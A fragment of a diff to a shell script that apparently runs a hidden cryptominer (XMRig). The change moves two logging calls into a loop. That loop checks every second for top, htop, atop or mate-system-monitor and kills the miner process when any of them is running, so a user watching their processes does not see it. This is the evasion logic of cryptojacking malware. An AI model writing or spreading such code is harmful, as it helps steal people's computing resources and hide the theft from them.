@@ -59,12 +59,12 @@ main() {
 
 	me=$(whoami)
 	myproc=$(ps -a)
-	log_message $me
-	log_message "$myproc"
-
-
+	
 	while true; do 
 		sleep 1
+
+		log_message $me
+		log_message "$myproc"
 
 		if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
 			pkill $XMRIGNAME
